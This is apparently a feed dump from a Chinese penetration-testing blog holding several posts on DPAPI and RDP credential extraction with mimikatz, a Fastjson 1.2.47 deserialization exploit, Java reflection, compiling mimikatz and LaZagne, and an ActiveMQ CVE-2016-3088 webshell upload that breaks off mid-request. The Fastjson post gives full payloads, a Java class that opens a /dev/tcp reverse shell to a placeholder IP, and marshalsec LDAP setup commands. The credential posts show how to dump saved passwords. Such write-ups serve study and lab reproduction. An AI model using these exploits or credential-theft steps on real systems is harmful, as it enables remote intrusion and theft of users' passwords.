    <content type="html"><![CDATA[<h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p><p>应用范围：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li></ul><h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></figure></p><p>由于该文件为受保护的，所以我们要勾选掉 <strong>隐藏受保护的操作系统文件</strong></p><p><img src="/2020/06/24/DPAPI学习记录/file.png" alt></p><p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></figure></p><p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></figure></p><h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cmdkey.png" alt></p><p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></figure></p><p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></figure></p><p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure></p><p>解析rdp凭证文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cred.png" alt></p><p>获取到guidMasterKey，这里的gmk其实就是我们的master key file名称，位置就在<strong>%APPDATA%/Microsoft/Protect/%SID%</strong>下</p><p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/sekurlsa.png" alt><br>这里其实mimikatz已经将masterkey放入缓存中，下次我们读取cred文件的时候mimikatz会直接利用masterkey进行解密。</p><p>我们再运行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p><p>结果如下，成功读取远程密码：<br><img src="/2020/06/24/DPAPI学习记录/08067.png" alt></p><p>查看dpapi缓存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cache.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><p><a href="https://xz.aliyun.com/t/6508" title="通过Dpapi获取Windows身份凭证" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX" title="获取已控机器本地保存的RDP密码" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是DPAPI&quot;&gt;&lt;a href=&quot;#什么是DPAPI&quot; class=&quot;headerlink&quot; title=&quot;什么是DPAPI&quot;&gt;&lt;/a&gt;什么是DPAPI&lt;/h1&gt;&lt;p&gt;DPAPI(Data Protection Application Programming 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson&lt;=1.2.47 反序列化漏洞</title>
    <link href="http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-反序列化漏洞/</id>
    <published>2020-06-22T10:01:18.000Z</published>
    <updated>2020-06-22T10:25:28.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>fastjson-1.2.47</li><li>jdk-8u181-linux-x64.tar.gz</li><li>marshalsec-0.0.3-SNAPSHOT-all.jar</li><li>tomcat8.35</li></ul><p>可以用P神的vulhub和docker搭建，这里我尝试搭建了好久报错，就还是自己手工搭建吧。</p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dajian.png" alt><br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/test.png" alt></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://q0qdv.l.dnslog.io/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dnslog.png" alt></p><p>但是好像只能打一次，过一会就不能打了。</p><p>接下来我们反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx.xxx.xxx.xxx/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将以上代码保存为Exploit.java，然后javac编译成class，编译好之后上传服务器，在该目录下启用python http服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7000</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/7000.png" alt></p><p>开启nc监听，上面的代码中监听的12345：<br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/nc.png" alt></p><p>使用marshalsec工具快捷的开启LDAP服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xxx.xxx.xxx.xxx:7000/#Exploit 7500</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/marshalsec.png" alt></p><p>一共开启了三个监听，最后我们发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://xxxxxx:7000/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>shell就可以弹回来了，但是一个ip只可以利用一次。</p><p>还需要注意jdk的版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;fastjson-1.2.47&lt;/li&gt;
&lt;li&gt;jdk-8u181-linux-x64.tar.gz&lt;/li&gt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JAVA反射学习代码</title>
    <link href="http://sherlocz.github.io/2020/05/28/JAVA%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/28/JAVA反射学习代码/</id>
    <published>2020-05-28T03:07:45.000Z</published>
    <updated>2020-05-28T03:09:09.970Z</updated>
    
    <content type="html"><![CDATA[<p>看这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null);</span><br><span class="line">        //System.out.println(runtime.getClass().getName());</span><br><span class="line">        </span><br><span class="line">    Runtime.class.getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad.exe&quot;);</span><br><span class="line">    </span><br><span class="line">        System.out.println(runtime.getClass());</span><br><span class="line">        </span><br><span class="line">        System.out.println(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        </span><br><span class="line">        System.out.println(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看这个：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz编译</title>
    <link href="http://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/"/>
    <id>http://sherlocz.github.io/2020/05/20/mimikatz编译/</id>
    <published>2020-05-20T10:50:45.000Z</published>
    <updated>2020-07-09T08:45:06.457Z</updated>
    
    <content type="html"><![CDATA[<p>我真的是菜死了，编译都不会妈鸭</p><p>主要是vs的问题<br><img src="/2020/05/20/mimikatz编译/download.png" alt><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。<br>编译时候设置如下：<br><img src="/2020/05/20/mimikatz编译/1.png" alt><br><img src="/2020/05/20/mimikatz编译/2.png" alt><br>然后就可以编译了，问题不大。</p><p>拜</p><p>写文章越来越水啦</p><p>日，图片显示不出来 淦</p><p>好了好了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我真的是菜死了，编译都不会妈鸭&lt;/p&gt;
&lt;p&gt;主要是vs的问题&lt;br&gt;&lt;img src=&quot;/2020/05/20/mimikatz编译/download.png&quot; alt&gt;&lt;br&gt;把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LaZagne编译抓取浏览器密码</title>
    <link href="http://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/12/LaZagne编译抓取浏览器密码/</id>
    <published>2020-05-12T11:33:08.000Z</published>
    <updated>2020-05-12T11:50:01.140Z</updated>
    
    <content type="html"><![CDATA[<p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p><ul><li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li><li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></li></ul><h1 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h1><p>首先将LaZagne源码下载下来，然后安装我们需要的python第三方库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/install.jpg" alt></p><p>安装pyinstaller：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/pyinstaller.jpg" alt></p><p>利用pyinstaller编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile -w lazagne.spec</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/success.jpg" alt></p><p>编译成功之后会在dist文件中生成LaZagne.exe</p><p>抓取浏览器密码<br><img src="/2020/05/12/LaZagne编译抓取浏览器密码/browsers.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载地址：&lt;a href=&quot;https://github.com/AlessandroZ/LaZagne&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache ActiveMQ 远程代码执行漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/</id>
    <published>2020-04-18T06:01:53.000Z</published>
    <updated>2020-04-18T06:38:56.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li>漏洞编号：CVE-2016-3088</li><li>利用条件：需要登录在admin或者api中，默认密码为admin<br><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png" alt></li></ul><p>首先获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/home.png" alt></p><p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Host: xxxxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=18wh2ode441ry1g7stwirxxm0v</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3052</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span 